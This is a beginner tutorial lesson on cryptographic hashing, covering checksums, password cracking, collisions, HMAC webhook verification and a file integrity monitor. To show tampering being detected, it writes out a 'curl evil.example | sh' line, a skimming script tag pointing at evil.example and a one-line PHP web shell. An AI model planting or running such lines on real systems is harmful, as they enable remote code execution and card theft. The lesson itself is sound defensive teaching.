@@ -1,0 +1,618 @@
+---
+title: "Hashing"
+summary: "From zero: what a cryptographic hash function is, its properties (deterministic, fixed size, one-way, avalanche effect, collision resistance), the common algorithms and which ones are broken (MD5, SHA-1) or recommended (SHA-256, SHA-3, BLAKE2), verifying downloads with checksums, why fast hashes of passwords are cracked in seconds, collisions and the birthday paradox, HMAC for authenticating messages and webhooks, how Git and Docker use hashes as IDs, and building a file integrity monitor."
+level: beginner
+minutes: 35
+prerequisites: ["Base64, Hex and Encoding vs Encryption"]
+tags: ["Cryptography", "Security"]
+---
+
+<Callout type="tip" title="In one minute">
+A **hash function** turns any input (a word, a file, a whole disk) into a short **fixed-size fingerprint** called a **hash** or **digest**, like SHA-256's 64 hex characters. Good cryptographic hashes are **deterministic** (same input → same hash), **one-way** (you can't get the input back), have an **avalanche effect** (change one character and about half the bits change), and are **collision-resistant** (it's practically impossible to find two inputs with the same hash). Use **SHA-256/SHA-512, SHA-3 or BLAKE2**; **MD5 and SHA-1 are broken** for security. Hashes verify **integrity** (downloads, files, Git commits). They are **not** encryption, and plain fast hashes are **not** safe for passwords (that needs slow, salted hashes). To prove **who** sent a message, add a secret key: **HMAC**.
+</Callout>
+
+## Start from zero
+
+<Callout type="analogy">
+A hash is like a **fingerprint of data**. Every person has a unique fingerprint, it's tiny compared to the whole person, and the police can check "is this the same person?" by comparing fingerprints. But you can't **rebuild a person from a fingerprint**. In the same way, you can check "is this the same file?" by comparing hashes, but you can't rebuild the file from its hash. And if someone changes even a single letter in a document, its fingerprint changes completely.
+</Callout>
+
+### Words you need first
+
+| Word | Simple meaning | Example |
+| --- | --- | --- |
+| **Hash function** | An algorithm that makes a fixed-size fingerprint of any data | SHA-256 |
+| **Hash / digest** | The fingerprint itself | `2cf24dba5f...` |
+| **Deterministic** | Same input always gives the same output | `hello` → always `2cf2...` |
+| **One-way (preimage resistant)** | You can't compute the input from the hash | |
+| **Avalanche effect** | A tiny input change completely changes the hash | `hello` vs `Hello` |
+| **Collision** | Two different inputs with the same hash | (should be practically impossible) |
+| **Checksum** | A hash published so others can verify a file | `SHA256SUMS` |
+| **HMAC** | A hash mixed with a secret key, proving who created a message | webhook signatures |
+| **Integrity** | Data hasn't been changed | download verification |
+
+## What is it?
+
+A cryptographic hash function takes input of **any length** and produces output of **one fixed length**. It's designed so that computing the hash is fast, but working backwards (or finding a second input with the same hash) is practically impossible.
+
+```text
+ "hello"                       ─┐
+ a 4 GB Ubuntu ISO              ├──►  SHA-256  ──►  always 256 bits (64 hex characters)
+ an empty file                 ─┘
+
+ hash ──► input ?   impossible (one-way)
+```
+
+Hashing is different from the other two operations you met in the previous lesson:
+
+| | Encoding | Encryption | Hashing |
+| --- | --- | --- | --- |
+| Reversible? | Yes, by anyone | Yes, with the key | **No** |
+| Output size | Grows with input | Grows with input | **Fixed** |
+| Purpose | Representation | Secrecy | **Integrity, identity, verification** |
+
+## Why does it matter?
+
+- **Integrity:** verify that a download, backup or deployment artefact wasn't corrupted or tampered with.
+- **Identity:** Git commits, Docker image digests, IPFS, package lock files and caches name things by their hash.
+- **Security building block:** digital signatures sign a **hash** of the document; TLS, JWTs, blockchains, password storage and HMAC all rely on hashes.
+- **Forensics and security operations:** malware is identified by its hash (VirusTotal, threat-intelligence feeds); evidence is hashed to prove it wasn't altered.
+- **Everyday engineering:** deduplicating files, cache keys, ETags in HTTP, detecting changed files in CI.
+
+## When and where do you use it?
+
+- **Use a hash** when you need to check "is this exactly the same data?" without comparing everything byte by byte, or to give data a stable ID.
+- **Use HMAC** when you also need to check "did someone with the secret key create this?" (webhooks, API request signing, cookies).
+- **Use a password hash** (bcrypt, scrypt, Argon2) for passwords. Never a plain fast hash. See **Password Storage: Salting and Slow Hashes**.
+- **Don't use a hash** when you need to get the data back. That's encryption.
+
+## Concepts one by one
+
+### 1. Deterministic and fixed-size
+
+<Explain>
+<What>
+The same input always gives exactly the same hash, on any computer, in any programming language. Whatever the input size, the output size is fixed: SHA-256 always gives 256 bits.
+</What>
+<Why>
+That's what makes comparison possible: if two hashes are equal, the data is (practically certainly) equal.
+</Why>
+<When>
+Checking downloads, comparing files, detecting changes.
+</When>
+<Where>
+`sha256sum` (Linux), `shasum -a 256` (macOS), `Get-FileHash` (PowerShell), `hashlib.sha256` (Python), `crypto.createHash("sha256")` (Node).
+</Where>
+<How>
+Hashes work on **bytes**: `hello`, `hello\n` (with a newline) and `Hello` are three different inputs with three different hashes.
+</How>
+</Explain>
+
+```bash
+printf 'hello' | sha256sum
+printf 'hello' | sha256sum
+printf 'Hello' | sha256sum
+head -c 1000000 /dev/zero | sha256sum | cut -c1-64 | awk '{print "1 MB of zeros -> " length($0) " hex chars"}'
+printf '' | sha256sum
+```
+
+```text output
+2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  -
+2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  -
+185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969  -
+1 MB of zeros -> 64 hex chars
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  -
+```
+
+Line by line:
+
+- `printf 'hello'` (no newline) piped into `sha256sum` gives the hash followed by `-` (meaning "standard input"). You'll get exactly this value on your own machine.
+- Running it again gives the identical hash: **deterministic**.
+- `Hello` with a capital H gives a completely different hash.
+- A 1 MB input still produces 64 hex characters (256 bits). So would a 100 GB file.
+- Even **empty** input has a hash: `e3b0c442...`. If you ever see this value in a log, something hashed an empty string or an empty file. It's a well-known value worth recognising.
+
+### 2. The avalanche effect
+
+<Explain>
+<What>
+Changing even **one bit** of the input changes, on average, **half** of the output bits, in a pattern that looks random.
+</What>
+<Why>
+So similar inputs don't produce similar hashes. An attacker can't make a "small" change and keep the hash close, or learn anything about the input from the hash.
+</Why>
+<When>
+It's a property you rely on whenever you use a hash to detect tampering.
+</When>
+<Where>
+All modern cryptographic hashes have it; simple checksums like CRC32 don't, in the same strong way.
+</Where>
+<How>
+Below we change one digit in a payment instruction and count how many of the 256 bits change.
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import hashlib
+a = hashlib.sha256(b"Transfer Rs 1000 to Ali").digest()
+b = hashlib.sha256(b"Transfer Rs 9000 to Ali").digest()
+diff = sum(bin(x ^ y).count("1") for x, y in zip(a, b))
+print(a.hex()[:32])
+print(b.hex()[:32])
+print(f"{diff} of 256 bits differ ({diff/256:.0%})")
+PY
+```
+
+```text output
+affdd41acc87f4635976965d7f001839
+6f2c0865f8f3e77be1d471f640b3391c
+120 of 256 bits differ (47%)
+```
+
+Line by line:
+
+- `.digest()` returns the raw 32 bytes of the hash (`.hexdigest()` would return the hex text).
+- The two messages differ in one character (`1` vs `9`).
+- The first 32 hex characters of the two hashes have nothing in common.
+- `x ^ y` (XOR) gives 1 where the bits differ; `bin(...).count("1")` counts them. Close to half of all bits changed, which is exactly what a good hash should do.
+
+### 3. Algorithms: which to use, which are broken
+
+<Explain>
+<What>
+Many hash functions exist. They differ in output size, speed and, most importantly, whether they're still **secure**.
+</What>
+<Why>
+A broken hash lets attackers create **collisions**: two different files with the same hash. Then a "verified" file or certificate can be swapped for a malicious one.
+</Why>
+<When>
+Choosing an algorithm for checksums, signatures, HMAC, content IDs.
+</When>
+<Where>
+**MD5** (broken since 2004; collisions take seconds) and **SHA-1** (practical collision "SHAttered" in 2017) must not be used for security. **SHA-256 / SHA-512** (SHA-2 family) are the default today; **SHA-3** and **BLAKE2/BLAKE3** are modern alternatives.
+</Where>
+<How>
+You'll still see MD5 and SHA-1 as **non-security** checksums (detecting accidental corruption) and in old systems. Git historically used SHA-1 and is moving to SHA-256 (with collision detection added in the meantime).
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import hashlib
+data = b"DevGuide"
+for name in ["md5", "sha1", "sha256", "sha512", "sha3_256", "blake2b"]:
+    h = hashlib.new(name, data).hexdigest()
+    print(f"{name:9} {len(h)*4:4} bits  {h[:32]}...")
+PY
+```
+
+```text output
+md5        128 bits  5a67d27e56a06a36de7b36a44b8c6018...
+sha1       160 bits  9921257f17d0fc793053c00bd759f11c...
+sha256     256 bits  77d71c2d38e12130c5b0609ffcd8d894...
+sha512     512 bits  d1184c9c535949ae3b71e8cd496feeb1...
+sha3_256   256 bits  b1af775c0f1a80d3382ccf0a006b69e8...
+blake2b    512 bits  177524009074fed54949e31791deb842...
+```
+
+Line by line:
+
+- `hashlib.new(name, data)` creates a hash object for the named algorithm.
+- Each hex character is 4 bits, so `len(h) * 4` gives the output size in bits.
+- Different algorithms give completely unrelated hashes of the same input. A hash is only meaningful together with its algorithm name, which is why formats write it as `sha256:77d71c...`.
+
+| Algorithm | Output | Status | Typical use today |
+| --- | --- | --- | --- |
+| MD5 | 128 bits | **Broken** | Legacy non-security checksums only |
+| SHA-1 | 160 bits | **Broken** (collisions) | Legacy; Git (with hardening) |
+| SHA-256 / SHA-512 | 256 / 512 bits | Secure | Default: TLS, signatures, checksums, Docker, Bitcoin |
+| SHA-3 | 224–512 bits | Secure | Alternative design to SHA-2 |
+| BLAKE2 / BLAKE3 | up to 512 bits | Secure, very fast | Files, deduplication, modern tools |
+
+### 4. Verifying downloads and files with checksums
+
+<Explain>
+<What>
+Publishers list the SHA-256 hash of each file (often in a `SHA256SUMS` file). After downloading, you hash your copy and compare.
+</What>
+<Why>
+It detects corrupted downloads and files modified on a mirror, a CDN or by malware.
+</Why>
+<When>
+Installing tools from the internet (Terraform, kubectl, OS images), downloading release binaries in CI, checking backups.
+</When>
+<Where>
+`sha256sum -c SHA256SUMS` checks every file listed. Package managers (apt, npm `integrity`, pip `--require-hashes`) do this automatically.
+</Where>
+<How>
+A checksum from the **same server** as the file only protects against accidents: an attacker who controls the server can change both. Real protection needs a **signed** checksum file (see **Digital Signatures**).
+</How>
+</Explain>
+
+```bash
+printf 'echo "installing app"\n' > install.sh
+printf 'v1 binary\n' > app.bin
+sha256sum install.sh app.bin > SHA256SUMS
+cut -c1-20 SHA256SUMS
+sha256sum -c SHA256SUMS
+echo 'curl evil.example | sh' >> install.sh
+sha256sum -c SHA256SUMS 2>&1; echo "exit code: $?"
+```
+
+```text output
+238b1853f684794a2b6e
+23db6578e3b56d4bda3c
+install.sh: OK
+app.bin: OK
+install.sh: FAILED
+app.bin: OK
+sha256sum: WARNING: 1 computed checksum did NOT match
+exit code: 1
+```
+
+Line by line:
+
+- `sha256sum install.sh app.bin > SHA256SUMS` writes one line per file: the hash, two spaces, and the file name. (`cut` shows only the start of each hash.)
+- `sha256sum -c SHA256SUMS` re-hashes every listed file and compares: both `OK`.
+- An attacker appends a malicious line to `install.sh`.
+- Checking again: `install.sh: FAILED`, a warning, and **exit code 1**, so a CI script using `set -e` would stop before running the tampered installer.
+
+### 5. One-way, but guessable: why plain hashes don't protect passwords
+
+<Explain>
+<What>
+You can't compute a password from its hash, but you **can guess**: hash each candidate password and compare. Fast hashes like SHA-256 can be computed **billions of times per second** on a GPU.
+</What>
+<Why>
+Most people choose predictable passwords, so a list of common passwords cracks a large share of leaked fast hashes almost instantly.
+</Why>
+<When>
+After a database leak, attackers run dictionary and rule-based attacks with tools like hashcat and John the Ripper.
+</When>
+<Where>
+Password storage needs **salts** (unique random values per user) and **slow** password hashing algorithms (bcrypt, scrypt, Argon2id), covered in their own lesson.
+</Where>
+<How>
+Below, an attacker has a leaked SHA-256 hash and a tiny word list.
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import hashlib
+leaked = hashlib.sha256(b"pakistan123").hexdigest()
+words = ["123456", "password", "qwerty", "iloveyou", "pakistan", "pakistan123", "admin"]
+for w in words:
+    if hashlib.sha256(w.encode()).hexdigest() == leaked:
+        print("cracked:", w, "after", words.index(w) + 1, "guesses")
+PY
+```
+
+```text output
+cracked: pakistan123 after 6 guesses
+```
+
+Line by line:
+
+- `leaked` stands for a password hash stolen from a database.
+- The loop hashes each guess and compares it with the leaked hash.
+- `pakistan123` is found on the 6th guess. Real word lists have billions of entries (leaked passwords, names, cities, cricket teams, years) and real GPUs try billions per second.
+
+### 6. Collisions and the birthday paradox
+
+<Explain>
+<What>
+Because inputs are unlimited and outputs are fixed-size, collisions **must** exist. Security means they're too hard to **find**. Due to the **birthday paradox**, you find a collision after about **2^(n/2)** tries for an n-bit hash, not 2^n.
+</What>
+<Why>
+That's why hashes need large outputs: 128-bit MD5 offers at most 64-bit collision resistance (and it's broken far below that), while SHA-256 offers about 128-bit, which is far beyond any computer.
+</Why>
+<When>
+Choosing hash sizes, judging "short hash" IDs (like 7-character Git hashes, which are fine for display but not for security).
+</When>
+<Where>
+In a room of just 23 people, there's a 50% chance two share a birthday, the same mathematics.
+</Where>
+<How>
+We can see it on a **truncated** hash: keep only the first 24 bits (6 hex characters) and look for a collision.
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import hashlib, itertools
+seen = {}
+for i in itertools.count():
+    msg = f"invoice-{i}".encode()
+    short = hashlib.sha256(msg).hexdigest()[:6]
+    if short in seen:
+        print(f"collision after {i + 1} messages: {seen[short].decode()} and {msg.decode()} both start with {short}")
+        break
+    seen[short] = msg
+PY
+```
+
+```text output
+collision after 5576 messages: invoice-76 and invoice-5575 both start with 77c621
+```
+
+Line by line:
+
+- We hash `invoice-0`, `invoice-1`, … and keep only the first 6 hex characters (24 bits, about 16.7 million possible values).
+- `seen` remembers which message produced each short hash. When a short hash appears twice, we've found a collision.
+- It took only **5,576** messages, close to √(16.7 million) ≈ 4,096, not millions. With the full 256 bits, the same search would need around 2^128 tries, which is impossible.
+
+### 7. HMAC: hashes with a secret key
+
+<Explain>
+<What>
+**HMAC** (Hash-based Message Authentication Code) combines a hash function with a **secret key**: `HMAC-SHA256(key, message)`. Only someone with the key can produce the right value.
+</What>
+<Why>
+A plain hash proves **integrity** only to someone who already trusts where the hash came from: an attacker who changes a message can simply recompute its plain hash. HMAC adds **authenticity**: without the key, you can't produce a valid HMAC for a changed message.
+</Why>
+<When>
+Verifying webhooks (Stripe, GitHub, Shopify and payment gateways send an HMAC signature header), signing API requests (AWS Signature v4), signed cookies, JWTs with HS256.
+</When>
+<Where>
+Python `hmac.new(key, msg, hashlib.sha256)`, Node `crypto.createHmac("sha256", key)`, OpenSSL `openssl dgst -sha256 -hmac key`.
+</Where>
+<How>
+Always compare signatures with a **constant-time** function (`hmac.compare_digest`, `crypto.timingSafeEqual`), so attackers can't learn the correct value from tiny timing differences.
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import hmac, hashlib, json
+secret = b"whsec_shared_with_provider"
+body = json.dumps({"event": "payment.succeeded", "orderId": "1042", "amount": 150000}, separators=(",", ":")).encode()
+sig = hmac.new(secret, body, hashlib.sha256).hexdigest()
+print("signature header:", sig[:32] + "...")
+
+def verify(body, header):
+    expected = hmac.new(secret, body, hashlib.sha256).hexdigest()
+    return hmac.compare_digest(expected, header)
+
+print("genuine request :", verify(body, sig))
+tampered = body.replace(b"150000", b"1")
+print("amount changed  :", verify(tampered, sig))
+forged = hashlib.sha256(tampered).hexdigest()
+print("attacker's plain sha256 as signature:", verify(tampered, forged))
+PY
+```
+
+```text output
+signature header: ecff4e0883b3171b4c2a1daab4aeaaed...
+genuine request : True
+amount changed  : False
+attacker's plain sha256 as signature: False
+```
+
+Line by line:
+
+- The payment provider and our server share `secret`. The provider computes `HMAC-SHA256(secret, body)` and sends it in a header such as `X-Signature`.
+- Our `verify` function recomputes the HMAC over the **raw body** it received and compares in constant time: the genuine request passes.
+- An attacker changes the amount to `1`. The old signature no longer matches.
+- The attacker tries to "sign" the changed body with a plain SHA-256. Without the secret, they can't produce the right HMAC, so it fails.
+- Verify the **exact raw bytes** received. Re-serialising parsed JSON can change spacing or key order and break a valid signature.
+
+### 8. Hashes as names: Git, Docker and caches
+
+<Explain>
+<What>
+**Content addressing** names data by its hash. If the content changes, the name changes.
+</What>
+<Why>
+You can't secretly modify content without changing its ID. Identical content is stored once (deduplication). Caches know exactly when something changed.
+</Why>
+<When>
+Git objects and commits, Docker image digests (`nginx@sha256:...`), npm/pip lockfile integrity hashes, build caches, IPFS, browser cache-busting file names (`app.3f2a1b9c.js`).
+</When>
+<Where>
+Pinning a Docker image by digest (`image: nginx@sha256:...`) guarantees exactly the same image, unlike a tag such as `nginx:latest`, which can move.
+</Where>
+<How>
+Git hashes the text `blob <size>\0<content>` with SHA-1 (or SHA-256 in new-format repositories).
+</How>
+</Explain>
+
+```bash
+printf 'hello\n' > hello.txt
+git init -q repo && cp hello.txt repo/ && cd repo
+echo "git hash-object : $(git hash-object hello.txt)"
+echo "sha1 by hand    : $(printf 'blob 6\0hello\n' | sha1sum | cut -c1-40)"
+```
+
+```text output
+git hash-object : ce013625030ba8dba906f756967f9e9ca394464a
+sha1 by hand    : ce013625030ba8dba906f756967f9e9ca394464a
+```
+
+Line by line:
+
+- `git hash-object hello.txt` prints the ID Git would give this file's content.
+- We rebuild it by hand: the header `blob 6` (type and size: `hello` plus a newline is 6 bytes), a zero byte `\0`, then the content, hashed with SHA-1. The values match exactly: Git's object IDs are just hashes (see **How Git Works**).
+
+### 9. Hashing large files in code
+
+<Explain>
+<What>
+Hash functions can process data in **chunks**, so you can hash a 50 GB file using only a few kilobytes of memory.
+</What>
+<Why>
+Reading a whole large file into memory to hash it can crash a program or a server.
+</Why>
+<When>
+Checksumming uploads, backups, disk images, build artefacts.
+</When>
+<Where>
+Python: call `h.update(chunk)` repeatedly, then `h.hexdigest()`; Node: `stream.pipe(crypto.createHash("sha256"))`; Python 3.11+ also has `hashlib.file_digest(f, "sha256")`.
+</Where>
+<How>
+Open files in **binary** mode, since hashes work on bytes.
+</How>
+</Explain>
+
+The hands-on below uses exactly this pattern in its `sha256_file` function: `iter(lambda: f.read(65536), b"")` reads 64 KB at a time until the end of the file.
+
+### 10. Cryptographic vs non-cryptographic hashes
+
+<Explain>
+<What>
+Not every "hash" is a cryptographic hash. **Non-cryptographic** hashes (CRC32, MurmurHash, xxHash, the hash functions inside dictionaries and hash tables) are designed for **speed**, not security.
+</What>
+<Why>
+They're fine for detecting accidental errors and spreading keys in a hash table, but attackers can easily create collisions in them.
+</Why>
+<When>
+CRC32 in ZIP files and Ethernet frames; MurmurHash in databases and caches; Python's `hash()` for dictionaries.
+</When>
+<Where>
+Never use them for anything security-related: integrity against attackers, IDs that must not be forged, signatures.
+</Where>
+<How>
+When in doubt, use SHA-256.
+</How>
+</Explain>
+
+## Hands-on
+
+Build a small **file integrity monitor**: record a baseline of SHA-256 hashes for a website's files, then detect any modified, deleted or new files, which is exactly how tools like AIDE, Tripwire and OSSEC detect a hacked server.
+
+```bash
+mkdir -p site
+printf '<h1>Shop</h1>\n' > site/index.html
+printf 'console.log(1)\n' > site/app.js
+printf 'body{}\n' > site/style.css
+cat > fim.py <<'PY'
+import hashlib, json, os, sys
+
+def sha256_file(path):
+    h = hashlib.sha256()
+    with open(path, "rb") as f:
+        for chunk in iter(lambda: f.read(65536), b""):
+            h.update(chunk)
+    return h.hexdigest()
+
+def scan(root):
+    return {os.path.relpath(os.path.join(d, n), root): sha256_file(os.path.join(d, n))
+            for d, _, files in os.walk(root) for n in sorted(files)}
+
+mode, root = sys.argv[1], sys.argv[2]
+if mode == "baseline":
+    json.dump(scan(root), open("baseline.json", "w"), indent=2, sort_keys=True)
+    print("baseline saved:", len(scan(root)), "files")
+else:
+    old, new = json.load(open("baseline.json")), scan(root)
+    changes = [("MODIFIED", p) for p in old if p in new and old[p] != new[p]]
+    changes += [("DELETED", p) for p in old if p not in new]
+    changes += [("NEW", p) for p in new if p not in old]
+    for kind, p in sorted(changes, key=lambda c: c[1]):
+        print(f"{kind:8} {p}")
+    print("no changes" if not changes else f"{len(changes)} change(s) detected")
+PY
+python3 fim.py baseline site
+python3 fim.py check site
+printf '<script src="https://evil.example/skim.js"></script>\n' >> site/app.js
+rm site/style.css
+printf '<?php system($_GET["c"]); ?>\n' > site/shell.php
+python3 fim.py check site
+```
+
+```text output
+baseline saved: 3 files
+no changes
+MODIFIED app.js
+NEW      shell.php
+DELETED  style.css
+3 change(s) detected
+```
+
+Line by line:
+
+- `site/` is a tiny website with three files.
+- `sha256_file` hashes a file in 64 KB chunks (concept 9), opened in binary mode.
+- `scan` walks every folder below `root` (`os.walk`) and builds a dictionary `{relative path: hash}`.
+- **baseline** mode saves that dictionary to `baseline.json`. In real life, store the baseline somewhere the attacker can't modify (read-only media, another server), or they'll simply update it.
+- **check** mode scans again and compares: same path with a different hash = MODIFIED, path missing = DELETED, unknown path = NEW.
+- The first check finds no changes.
+- Then we simulate an attack: a card-skimming script is appended to `app.js` (a "Magecart"-style attack on checkout pages), `style.css` is deleted, and a PHP **web shell** is dropped that runs any command passed in the URL.
+- The second check reports all three changes, which would trigger an alert and an investigation.
+
+## Real-world example
+
+In 2016, attackers broke into the Linux Mint website and replaced the download link with a backdoored ISO. Users who compared the published checksum would have noticed the mismatch, but the attackers also changed the checksum **on the same website**, which is why checksums must be **signed** or published somewhere separate. Today, serious projects publish a `SHA256SUMS` file signed with their key, CI pipelines verify downloaded tools against pinned hashes, and container deployments pin images by digest (`@sha256:...`). In incident response, the first thing analysts do with a suspicious file is hash it and search the hash on VirusTotal and threat-intelligence platforms: if it's known malware, the hash tells them in seconds.
+
+## Common mistakes
+
+- **Calling hashing "encryption"** or expecting to "decrypt" a hash.
+- **Using MD5 or SHA-1** for anything security-related (signatures, certificates, integrity against attackers).
+- **Storing passwords as plain SHA-256** (or MD5), without salt and without a slow algorithm.
+- **Publishing checksums next to the file on the same server** and assuming that protects against attackers.
+- **Using a plain hash where you need HMAC:** anyone can recompute a plain hash of a modified message.
+- **Comparing signatures with `==`** instead of a constant-time comparison.
+- **Hashing re-serialised data** instead of the original raw bytes (webhook verification fails, or worse, passes for the wrong data).
+- **Forgetting that hashes depend on exact bytes:** newlines, encodings and trailing spaces all change the result.
+- **Using short or non-cryptographic hashes** (CRC32, first 8 characters) as security identifiers.
+
+## Security lens
+
+<Callout type="security">
+Hashes prove integrity only when the hash itself is trustworthy. Protect the reference hash with a signature, a separate channel, or a secret key (HMAC).
+</Callout>
+
+- **Choose secure algorithms:** SHA-256 or better for integrity and signatures; Argon2id, scrypt or bcrypt for passwords; HMAC-SHA256 for message authentication.
+- **Pin by hash:** Docker images by digest, GitHub Actions by commit SHA, dependencies with lockfile integrity hashes, downloads with verified checksums.
+- **Detect tampering:** file integrity monitoring on servers, hashing evidence in forensics (chain of custody), and comparing build artefacts (reproducible builds).
+- **Threat intelligence:** indicators of compromise (IOCs) often include file hashes (MD5/SHA-1/SHA-256) of known malware. Note that attackers change one byte to get a new hash, so hashes catch known samples, not new variants.
+- **Timing attacks:** always compare secrets, tokens and MACs in constant time.
+
+## Interview questions
+
+<QA q="What are the properties of a cryptographic hash function?">
+It is deterministic and produces a fixed-size output for any input. It is preimage resistant, meaning the input cannot be found from the hash, second-preimage resistant, meaning another input with the same hash cannot be found for a given input, and collision resistant, meaning no two inputs with the same hash can practically be found. It also shows the avalanche effect, where a tiny input change completely changes the output.
+</QA>
+
+<QA q="What is the difference between hashing and encryption?">
+Encryption is reversible with the correct key and is used for confidentiality. Hashing is one-way and produces a fixed-size digest used for integrity checks, identifiers, signatures and, with slow salted algorithms, password storage. A hash cannot be decrypted, only guessed by hashing candidate inputs.
+</QA>
+
+<QA q="Why are MD5 and SHA-1 considered broken?">
+Practical collision attacks exist for both: different inputs with the same MD5 hash can be generated in seconds, and a SHA-1 collision was demonstrated publicly in 2017. Attackers can therefore create two documents or certificates with the same hash and swap them, so neither should be used for signatures or integrity against attackers.
+</QA>
+
+<QA q="What is HMAC and why not just use a hash?">
+HMAC combines a cryptographic hash with a secret key, so only parties who know the key can produce a valid code for a message. A plain hash can be recomputed by anyone who modifies the message, so it provides no authenticity. HMAC is used for webhook signatures, API request signing and signed cookies, and its values should be compared in constant time.
+</QA>
+
+<QA q="Why are fast hashes like SHA-256 not suitable for storing passwords?">
+They are designed to be fast, so attackers can compute billions of guesses per second, and without a unique salt identical passwords produce identical hashes and precomputed tables can be used. Passwords should be hashed with slow, memory-hard, salted algorithms such as Argon2id, scrypt or bcrypt.
+</QA>
+
+## Key terms
+
+<Terms>
+  <Term name="Hash function">Algorithm producing a fixed-size digest from any input.</Term>
+  <Term name="Digest">The output of a hash function.</Term>
+  <Term name="Avalanche effect">Small input change flips about half the output bits.</Term>
+  <Term name="Preimage resistance">Infeasible to find an input for a given hash.</Term>
+  <Term name="Collision resistance">Infeasible to find two inputs with the same hash.</Term>
+  <Term name="Birthday paradox">Collisions appear after about the square root of the output space.</Term>
+  <Term name="Checksum">Published hash used to verify a file.</Term>
+  <Term name="HMAC">Keyed hash proving integrity and authenticity.</Term>
+  <Term name="Content addressing">Naming data by its hash, as in Git and Docker digests.</Term>
+  <Term name="File integrity monitoring">Detecting file changes by comparing hashes to a baseline.</Term>
+</Terms>
+
+## Practice
+
+1. Hash the same text with and without a trailing newline (`echo` vs `printf`) and explain the difference.
+2. Download a tool such as Terraform or kubectl, find its official checksum file, and verify your download with `sha256sum -c`.
+3. Find the SHA-256 digest of a Docker image you use (`docker images --digests`) and pin it in a Compose file.
+4. Write a webhook receiver function that verifies an HMAC-SHA256 header with a constant-time comparison.
+5. Change the truncated-collision demo to 32 bits (8 hex characters) and estimate how many messages you need.
+6. Run the file integrity monitor on one of your project folders, change a file, and see it detected.
+
+Next: **Symmetric Encryption**.
